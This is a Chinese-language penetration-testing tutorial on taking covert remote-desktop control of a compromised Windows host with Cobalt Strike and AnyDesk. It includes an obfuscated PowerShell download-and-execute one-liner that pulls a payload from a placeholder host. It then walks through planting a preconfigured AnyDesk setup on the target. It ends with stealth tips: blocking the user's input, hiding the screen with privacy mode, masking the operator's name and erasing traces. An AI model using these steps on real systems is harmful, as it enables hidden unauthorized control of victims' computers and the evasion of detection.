在进行内网渗透的时候，如果目标机器出网，但是有时候目标3389端口未开放也就表示我们无法使用远程桌面进行连接。但是依然有很多第三方远程控制软件可以帮助我们，例如Teamviewer或者AnyDesk。

本片文章我们将使用Cobalt Strike配合AnyDesk进行演示。

## 首先上线cs

这里我们使用powershell上线，首先我们使用Payload Generator生成一个ps1脚本  
![](https://image.3001.net/images/20210730/1627616645_610375850f587f28071ea.png!small)![](https://image.3001.net/images/20210730/1627616645_61037585d835cc1ef902b.png!small)

然后在目标机器上执行：(使用管理员权限执行)

    
    
    powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='11(''https://www.xxxx.tk:8443/payload.ps1'')'.Replace('11','adString');IEX ($a+$b)"
    

![](https://image.3001.net/images/20210730/1627616646_61037586992a6d23108e5.png!small)可以看到上线成功  
![](https://image.3001.net/images/20210730/1627616647_61037587d8516f37acbce.png!small)

## 下载anydesk

获取到权限以后 ，我们在目标机器上下载anydesk：

    
    
    powershell (New-Object System.Net.WebClient).DownloadFile(“https://download.anydesk.com/AnyDesk.exe","C:\anydesk.exe")
    

![](https://image.3001.net/images/20210730/1627616648_61037588c472fc344a62b.png!small)我们看到anydesk已经下载到了目标主机上，这是我们先不急着打开，我们先添加他的配置文件

## 生成配置文件

如果我们直接打开的话，我们不知道他的id号，也不能通过密码进行登录，更不可能直接修改，这时候我们可以先在本机生成一个配置文件，然后将配置文件拷过去。

所以我们先下载一个anydesk到本地，然后打开它，记住他的id号，例如我的就是802691146

我们为自主访问设置密码![](https://image.3001.net/images/20210730/1627616649_610375899b4a043840c9f.png!small)在这里随便设置一个密码

![](https://image.3001.net/images/20210730/1627616650_6103758adc4255fd54c1a.png!small)

然后我们将anydesk彻底关闭，退出的时候选择不安装anydesk

他会自动将配置文件生成在

`%appdata%\AnyDesk`

，也就是

`C:\Users\你的用户名\AppData\Roaming\AnyDesk`

  
![](https://image.3001.net/images/20210730/1627616651_6103758b960142ab7b657.png!small)我们将这四个文件保存下来，然后上传到目标主机的对应位置，
**务必记得保存到别处以后把本机的配置文件删除**

## 上传配置文件并启动anydesk

在这个路径下新建一个名为`AnyDesk`的文件夹  
![](https://image.3001.net/images/20210730/1627616652_6103758c42e014c97edde.png!small)然后在此文件夹下上传刚刚保存的四个配置文件  
![](https://image.3001.net/images/20210730/1627616652_6103758ce2fa1fce99744.png!small)

然后启动anydesk  
![](https://image.3001.net/images/20210730/1627616653_6103758d9a041987c132a.png!small)

连接测试，提示输入密码  
![](https://image.3001.net/images/20210730/1627616654_6103758e7e47f16d61487.png!small)![](https://image.3001.net/images/20210730/1627616656_61037590d909e667f1d53.png!small)

成功连接

## 注意事项

这里说一下避免踩坑的几个点：

记的在这里一定要把用户名称改成自定义，否则在那边直接会显示你的用户名 \手动狗头  
![](https://image.3001.net/images/20210730/1627616664_610375987902b44276bed.png!small)

生成配置文件后将配置文件保存后记的删除配置文件，下次你重新启动anydesk的时候会自动生成并自动重新分配一个id

目标主机必须有管理员权限

必要时可以可以设置代理，避免让对方反制自己(由于我是用的是clash，直接代理的本地7890端口)

控制目标机器后可以 **关闭目标机器的anydesk** ，但实际不会断开连接，且连接结束后会自动结束目标机器的anydesk进程，便于消除痕迹

控制目标机器后记的开启 **禁止用户输入** 和 **启动隐私模式**  
![](https://image.3001.net/images/20210730/1627625438_610397de918195aad44c1.png!small)

